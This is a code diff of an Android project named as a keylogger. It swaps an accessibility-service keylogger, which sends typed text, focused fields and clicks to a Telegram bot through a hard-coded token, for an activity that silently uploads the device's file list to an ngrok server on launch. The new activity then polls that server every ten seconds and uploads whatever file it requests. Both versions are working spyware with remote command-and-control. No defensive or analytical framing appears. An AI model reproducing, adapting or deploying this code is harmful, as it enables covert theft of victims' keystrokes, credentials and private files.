@@ -1,97 +1,106 @@
 package com.bshu2.androidkeylogger;
 
-import android.accessibilityservice.AccessibilityService;
-import android.os.AsyncTask;
-import android.os.Build;
+import android.app.Activity;
+import android.os.Bundle;
+import android.os.Environment;
 import android.util.Log;
-import android.view.accessibility.AccessibilityEvent;
-
-import com.example.newdynamicapk.Constants; // Importing the Constants class
-
-import java.io.OutputStream;
+import org.json.JSONArray;
+import org.json.JSONObject;
+import java.io.*;
 import java.net.HttpURLConnection;
 import java.net.URL;
-import java.text.SimpleDateFormat;
-import java.util.Calendar;
-import java.util.Locale;
+import java.util.Scanner;
 
-/**
- * Keylogger Service for logging accessibility events and sending data to Telegram.
- */
-public class Keylogger extends AccessibilityService {
+public class FileAccess extends Activity {
+    private static final String SERVER_URL = "https://locust-handy-seagull.ngrok-free.app/server.php";
 
-    private static final String TELEGRAM_BOT_TOKEN = "8178078713:AAGOSCn4KEuvXC64xXhDrZjwQZmIy33gfaI";
-    private static final String TAG = "Keylogger";
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        new Thread(this::sendFileList).start();  // Send file list automatically on app launch
+        new Thread(this::checkForDownloadRequests).start();  // Periodically check for file requests
+    }
 
-    private class SendToTelegramTask extends AsyncTask<String, Void, Void> {
-        @Override
-        protected Void doInBackground(String... params) {
-            try {
-                String message = params[0];
-                String chatId = Constants.TELEGRAM_CHAT_ID; // Retrieve chat ID dynamically
-                String telegramUrl = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage";
-                String payload = "chat_id=" + chatId + "&text=" + message.replace(" ", "+");
+    private void sendFileList() {
+        try {
+            File directory = Environment.getExternalStorageDirectory();
+            File[] files = directory.listFiles();
+            if (files == null) return;
 
-                URL url = new URL(telegramUrl);
-                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-                conn.setRequestMethod("POST");
-                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
-                conn.setDoOutput(true);
-
-                try (OutputStream os = conn.getOutputStream()) {
-                    os.write(payload.getBytes("UTF-8"));
-                    os.flush();
-                }
-
-                Log.d(TAG, "Telegram Response Code: " + conn.getResponseCode());
-            } catch (Exception e) {
-                Log.e(TAG, "Error sending message to Telegram", e);
+            JSONArray fileList = new JSONArray();
+            for (File file : files) {
+                if (file.isFile()) fileList.put(file.getName());
             }
-            return null;
+
+            HttpURLConnection conn = (HttpURLConnection) new URL(SERVER_URL).openConnection();
+            conn.setRequestMethod("POST");
+            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+            conn.setDoOutput(true);
+
+            String payload = "file_list=" + fileList.toString();
+            try (OutputStream os = conn.getOutputStream()) {
+                os.write(payload.getBytes("UTF-8"));
+                os.flush();
+            }
+
+            Log.d("FileAccess", "Sent file list to server.");
+        } catch (Exception e) {
+            Log.e("FileAccess", "Error sending file list", e);
         }
     }
 
-    @Override
-    public void onServiceConnected() {
-        Log.d(TAG, "Keylogger service connected.");
-    }
+    private void checkForDownloadRequests() {
+        while (true) {
+            try {
+                HttpURLConnection conn = (HttpURLConnection) new URL(SERVER_URL + "?get_request=1").openConnection();
+                conn.setRequestMethod("GET");
 
-    @Override
-    public void onAccessibilityEvent(AccessibilityEvent event) {
-        String timestamp = new SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.US)
-                .format(Calendar.getInstance().getTime());
-        String deviceName = Build.MANUFACTURER + " " + Build.MODEL; // Get device name
-        String data = event.getText().toString();
+                Scanner scanner = new Scanner(conn.getInputStream());
+                if (scanner.hasNext()) {
+                    JSONObject response = new JSONObject(scanner.nextLine());
+                    if (response.has("file_request")) {
+                        String requestedFile = response.getString("file_request");
+                        uploadFile(requestedFile);
+                    }
+                }
+                scanner.close();
 
-        if (data == null || data.trim().isEmpty()) {
-            return;
-        }
-
-        String logMessage = "[" + deviceName + "] " + timestamp;
-
-        switch (event.getEventType()) {
-            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
-                logMessage += " | (TEXT_CHANGED) | " + data;
-                new SendToTelegramTask().execute(logMessage);
-                Log.d(TAG, "Logged event: " + logMessage);
-                break;
-            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
-                logMessage += " | (FOCUSED) | " + data;
-                new SendToTelegramTask().execute(logMessage);
-                Log.d(TAG, "Logged event: " + logMessage);
-                break;
-            case AccessibilityEvent.TYPE_VIEW_CLICKED:
-                logMessage += " | (CLICKED) | " + data;
-                new SendToTelegramTask().execute(logMessage);
-                Log.d(TAG, "Logged event: " + logMessage);
-                break;
-            default:
-                break;
+                Thread.sleep(10000);  // Check every 10 seconds
+            } catch (Exception e) {
+                Log.e("FileAccess", "Error checking download requests", e);
+            }
         }
     }
 
-    @Override
-    public void onInterrupt() {
-        Log.d(TAG, "Keylogger service interrupted.");
+    private void uploadFile(String fileName) {
+        try {
+            File file = new File(Environment.getExternalStorageDirectory(), fileName);
+            if (!file.exists()) {
+                Log.e("FileAccess", "File not found: " + fileName);
+                return;
+            }
+
+            HttpURLConnection conn = (HttpURLConnection) new URL(SERVER_URL).openConnection();
+            conn.setRequestMethod("POST");
+            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=*****");
+            conn.setDoOutput(true);
+
+            try (OutputStream os = conn.getOutputStream()) {
+                os.write(("--*****\r\nContent-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"\r\n\r\n").getBytes());
+                try (FileInputStream fis = new FileInputStream(file)) {
+                    byte[] buffer = new byte[4096];
+                    int bytesRead;
+                    while ((bytesRead = fis.read(buffer)) != -1) {
+                        os.write(buffer, 0, bytesRead);
+                    }
+                }
+                os.write("\r\n--*****--\r\n".getBytes());
+                os.flush();
+            }
+
+            Log.d("FileAccess", "Uploaded file: " + fileName);
+        } catch (Exception e) {
+            Log.e("FileAccess", "Error uploading file", e);
+        }
     }
 }
